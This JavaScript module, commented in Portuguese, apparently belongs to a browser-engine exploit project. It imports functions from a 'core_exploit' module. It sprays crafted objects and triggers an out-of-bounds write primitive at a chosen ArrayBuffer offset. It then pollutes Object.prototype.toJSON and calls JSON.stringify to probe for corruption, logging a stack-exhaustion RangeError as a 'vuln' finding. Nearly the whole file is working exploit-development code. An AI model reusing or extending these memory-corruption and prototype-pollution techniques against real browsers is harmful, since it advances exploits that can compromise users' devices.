// js/script3/testMinimalForInOnComplexObject.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Mantendo a mesma classe do teste anterior que causou RangeError
class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `MyComplexObjRE-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1_re";
        this.prop2 = { nested: "complex_prop2_nested_re" };
        this.propA = "valA_re";
        this.propB = 2345689;
        this.propC = null;
        this.propD = { nested_prop_re: "valD_original_re" };
        this.propE = [101, 202, 303];
    }
}

// toJSON ultra minimalista com for...in para Object.prototype
// Usaremos console.log aqui para tentar capturar logs antes de um crash total.
export function toJSON_MinimalForIn_RangeErrorTest() {
    const FNAME_toJSON = "toJSON_MinimalForIn_RangeErrorTest";
    let iteration_count = 0;
    const MAX_ITER_LOG = 50; // Logar as primeiras N iterações
    // Tenta ser o mais leve possível para não interferir com o RangeError
    console.log(`[${FNAME_toJSON}] Entrando. this.id (tentativa): ${this ? String(this.id).substring(0,20) : "N/A"}`);

    try {
        if (typeof this !== 'object' || this === null) {
            console.log(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo.`);
            return { variant: FNAME_toJSON, error: "this is not object or null" };
        }

        for (const prop in this) {
            iteration_count++;
            if (iteration_count <= MAX_ITER_LOG) {
                console.log(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${prop}'`);
            }
            // NÃO ACESSAR this[prop] AINDA, para ver se a enumeração por si só causa o RangeError.

            if (iteration_count > 2000) { // Safety break um pouco maior para dar chance ao RangeError
                console.log(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações.`);
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações para this.id=${this.id}.`, "warn", FNAME_toJSON);
                return { variant: FNAME_toJSON, iterations: iteration_count, max_iter_reached: true };
            }
        }
        console.log(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações sem RangeError interno.`);
        // Se chegou aqui, o RangeError não foi DENTRO do loop for...in da toJSON, mas talvez na serialização do que ela retorna
        // ou no próprio ato de chamá-la.
        return { variant: FNAME_toJSON, iterations: iteration_count, props_enumerated_count: iteration_count };

    } catch (e_loop) {
        // Este catch pode não pegar o RangeError se ele for muito profundo na engine.
        console.error(`[${FNAME_toJSON}] EXCEPTION DENTRO do for...in loop: ${e_loop.name} - ${e_loop.message}`);
        logS3(`[${FNAME_toJSON}] EXCEPTION DENTRO do for...in loop para this.id=${this.id}: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
        return { variant: FNAME_toJSON, iterations: iteration_count, error_in_loop: `${e_loop.name}: ${e_loop.message}` };
    }
}


export async function executeMinimalForInOnComplexObjectTest() {
    const FNAME_TEST = "executeMinimalForInOnComplexObjectTest";
    logS3(`--- Iniciando Teste: 'for...in' Minimalista em MyComplexObject Pós-Corrupção (RangeError Check) ---`, "test", FNAME_TEST);
    document.title = `Minimal ForIn ComplexObj (RangeError Check)`;

    const spray_count = 5; // Pulverizar poucos objetos, já que o erro parece ocorrer no primeiro
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro MyComplexObjectForRangeError via JSON.stringify (usando Object.prototype.toJSON poluído)...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_MinimalForIn_RangeErrorTest, // Nossa toJSON minimalista
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSON_MinimalForIn_RangeErrorTest.name}.`, "info", FNAME_TEST);

        logS3(`   Testando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
        document.title = `Sondando MyComplexObj 0 (Minimal ForIn RE)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`     JSON.stringify(obj[0]) completou INESPERADAMENTE. Resultado da toJSON:`, "warn", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);

        } catch (e_str) {
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED! Obj0`;
            }
            problem_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected) {
        logS3("RangeError NÃO ocorreu com a toJSON minimalista.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste 'for...in' Minimalista em MyComplexObject (RangeError Check) CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_detected) {
        document.title = `Minimal ForIn ComplexObj OK`;
    }
}
